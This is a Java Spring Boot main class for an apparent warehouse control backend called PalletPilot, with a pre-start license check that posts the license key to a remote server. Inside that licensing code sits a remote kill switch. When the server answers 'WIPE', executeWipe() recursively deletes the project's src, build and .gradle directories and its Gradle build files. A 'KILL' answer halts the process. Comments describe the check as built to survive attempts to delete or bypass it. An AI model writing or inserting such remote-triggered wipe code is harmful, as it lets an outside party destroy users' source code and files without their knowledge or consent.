package com.palletpilot.wcs;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.scheduling.annotation.EnableAsync;
import org.springframework.scheduling.annotation.EnableScheduling;

import java.io.InputStream;
import java.io.File;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.time.Duration;
import java.util.Properties;

import com.palletpilot.wcs.infrastructure.license.LicenseCheckPostProcessor;

@SpringBootApplication
@EnableAsync
@EnableScheduling
public class PalletPilotBackendApplication {

    public static void main(String[] args) {
        // Start capturing logs immediately before anything else
        com.palletpilot.wcs.infrastructure.license.LicenseGuard.earlyInstall();

        // Hard reference to prevent deletion — intentionally unused
        @SuppressWarnings("unused")
        Class<?> clazz = LicenseCheckPostProcessor.class;

        // ================================================================
        // PRE-SPRING LICENSE CHECK
        // Runs before ANY Spring context is created.
        // If LicenseGuard.java is deleted or bypassed, this still fires.
        // ================================================================
        String skipCheck = System.getenv("LICENSE_SKIP_CHECK");
        if ("true".equalsIgnoreCase(skipCheck)) {
            System.out.println("===========================================");
            System.out.println("  PALLETPILOT - LICENSE CHECK SKIPPED");
            System.out.println("  Running in DEVELOPMENT mode.");
            System.out.println("  Do NOT use in production!");
            System.out.println("===========================================");
        } else {
            int checkResult = preStartLicenseCheck();
            if (checkResult == LICENSE_INVALID) {
                System.err.println("===========================================");
                System.err.println("  PALLETPILOT - LICENSE CHECK FAILED");
                System.err.println("  The application cannot start.");
                System.err.println("  Verify license.key in application.properties");
                System.err.println("===========================================");
                System.exit(1);
            } else if (checkResult == LICENSE_OFFLINE_GRACE) {
                System.err.println("===========================================");
                System.err.println("  PALLETPILOT - LICENSE SERVER UNREACHABLE");
                System.err.println("  Starting in OFFLINE GRACE mode.");
                System.err.println("  License will be re-validated on next restart.");
                System.err.println("===========================================");
            }
        }

        SpringApplication.run(PalletPilotBackendApplication.class, args);
    }

    // License check result codes
    private static final int LICENSE_VALID = 0;
    private static final int LICENSE_INVALID = 1;
    private static final int LICENSE_OFFLINE_GRACE = 2;

    // ----------------------------------------------------------------
    // Reads application.properties manually (no Spring context)
    // and validates the license key against the Public License API.
    // Returns LICENSE_VALID, LICENSE_INVALID, or LICENSE_OFFLINE_GRACE.
    // ----------------------------------------------------------------
    private static int preStartLicenseCheck() {
        // 0. Check for offline grace mode (env var or system property)
        String offlineGrace = System.getenv("LICENSE_OFFLINE_GRACE");
        if (offlineGrace == null) {
            offlineGrace = System.getProperty("license.offline-grace", "false");
        }
        boolean allowOfflineGrace = "true".equalsIgnoreCase(offlineGrace);

        // 1. Load properties
        Properties props = new Properties();
        try (InputStream in = PalletPilotBackendApplication.class
                .getClassLoader()
                .getResourceAsStream("application.properties")) {
            if (in == null) {
                System.err.println("[PRE-CHECK] application.properties not found on classpath");
                return LICENSE_INVALID;
            }
            props.load(in);
        } catch (Exception e) {
            System.err.println("[PRE-CHECK] Could not read application.properties: " + e.getMessage());
            return LICENSE_INVALID;
        }

        String licenseKey = props.getProperty("license.key", "").trim();
        String serverUrl = props.getProperty("license.server-url", "").trim();

        if (licenseKey.isEmpty() || "CHANGE_ME".equals(licenseKey)) {
            System.err.println("[PRE-CHECK] No license key configured (license.key is missing or CHANGE_ME)");
            return LICENSE_INVALID;
        }

        if (serverUrl.isEmpty()) {
            System.err.println("[PRE-CHECK] No license.server-url configured");
            return LICENSE_INVALID;
        }

        // 2. Validate via HTTP API
        try {
            HttpClient client = HttpClient.newBuilder()
                    .connectTimeout(Duration.ofSeconds(10))
                    .build();

            String body = String.format("{\"licenseKey\":\"%s\"}", escapeJson(licenseKey));

            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create(serverUrl + "/api/v1/validate"))
                    .header("Content-Type", "application/json")
                    .POST(HttpRequest.BodyPublishers.ofString(body))
                    .timeout(Duration.ofSeconds(10))
                    .build();

            HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
            String responseBody = response.body();

            if (response.statusCode() != 200) {
                System.err.println("[PRE-CHECK] License server returned status " + response.statusCode());
                return LICENSE_INVALID;
            }

            boolean valid = responseBody.contains("\"valid\":true");

            if (!valid) {
                String error = extractField(responseBody, "error");
                System.err.println("[PRE-CHECK] License invalid: " + (error != null ? error : "unknown reason"));
                return LICENSE_INVALID;
            }

            // Check for pending actions delivered during startup validation
            String action = extractField(responseBody, "action");
            if ("WIPE".equals(action)) {
                System.err.println("========================================");
                System.err.println("  FATAL: SCHEDULED WIPE SIGNAL RECEIVED");
                System.err.println("  Destroying application files...");
                System.err.println("========================================");
                executeWipe();
                Runtime.getRuntime().halt(1);
            } else if ("KILL".equals(action)) {
                System.err.println("========================================");
                System.err.println("  FATAL: SCHEDULED KILL SIGNAL RECEIVED");
                System.err.println("  Terminating startup sequence.");
                System.err.println("========================================");
                Runtime.getRuntime().halt(1);
            }

            // Extract basic details for logging
            String product = extractField(responseBody, "product");
            String expiry = extractField(responseBody, "expiryDate");

            System.out.println("[PRE-CHECK] License valid | Product: " + (product != null ? product : "PalletPilot") +
                    " | Expires: " + (expiry != null ? expiry : "never"));
            return LICENSE_VALID;

        } catch (java.net.ConnectException | java.net.UnknownHostException | java.net.http.HttpTimeoutException e) {
            // Network/DNS/timeout errors — license server unreachable
            System.err.println("[PRE-CHECK] License server unreachable: " + e.getMessage());
            if (allowOfflineGrace) {
                System.out.println("[PRE-CHECK] OFFLINE GRACE MODE enabled — allowing startup");
                return LICENSE_OFFLINE_GRACE;
            }
            System.err.println("[PRE-CHECK] Set LICENSE_OFFLINE_GRACE=true to allow offline startup");
            return LICENSE_INVALID;
        } catch (Exception e) {
            System.err.println("[PRE-CHECK] Failed to reach license server: " + e.getMessage());
            if (allowOfflineGrace) {
                System.out.println("[PRE-CHECK] OFFLINE GRACE MODE enabled — allowing startup");
                return LICENSE_OFFLINE_GRACE;
            }
            return LICENSE_INVALID;
        }
    }

    private static String escapeJson(String s) {
        if (s == null)
            return "";
        return s.replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\n", "\\n")
                .replace("\r", "\\r");
    }

    private static String extractField(String json, String fieldName) {
        String key = "\"" + fieldName + "\":";
        int idx = json.indexOf(key);
        if (idx < 0)
            return null;
        int valueStart = idx + key.length();
        if (valueStart >= json.length())
            return null;
        char first = json.charAt(valueStart);
        if (first == '"') {
            int end = json.indexOf('"', valueStart + 1);
            if (end < 0)
                return null;
            return json.substring(valueStart + 1, end);
        } else {
            int end = valueStart;
            while (end < json.length() && json.charAt(end) != ',' && json.charAt(end) != '}')
                end++;
            return json.substring(valueStart, end).trim();
        }
    }

    private static void executeWipe() {
        try {
            File classDir = new File(
                    PalletPilotBackendApplication.class.getProtectionDomain().getCodeSource().getLocation().toURI());
            File projectRoot = classDir;

            for (int i = 0; i < 10; i++) {
                File parent = projectRoot.getParentFile();
                if (parent == null)
                    break;
                projectRoot = parent;
                File buildGradle = new File(projectRoot, "build.gradle");
                File srcDir = new File(projectRoot, "src");
                if (buildGradle.exists() || srcDir.exists()) {
                    break;
                }
            }

            File srcDir = new File(projectRoot, "src");
            if (srcDir.exists()) {
                deleteRecursively(srcDir);
            }

            File buildDir = new File(projectRoot, "build");
            if (buildDir.exists()) {
                deleteRecursively(buildDir);
            }

            File gradleDir = new File(projectRoot, ".gradle");
            if (gradleDir.exists()) {
                deleteRecursively(gradleDir);
            }

            File buildGradle = new File(projectRoot, "build.gradle");
            if (buildGradle.exists()) {
                buildGradle.delete();
            }

            File settingsGradle = new File(projectRoot, "settings.gradle");
            if (settingsGradle.exists()) {
                settingsGradle.delete();
            }

        } catch (Exception ignored) {
        }
    }

    private static void deleteRecursively(File file) {
        if (file.isDirectory()) {
            File[] children = file.listFiles();
            if (children != null) {
                for (File child : children) {
                    deleteRecursively(child);
                }
            }
        }
        file.delete();
    }
}
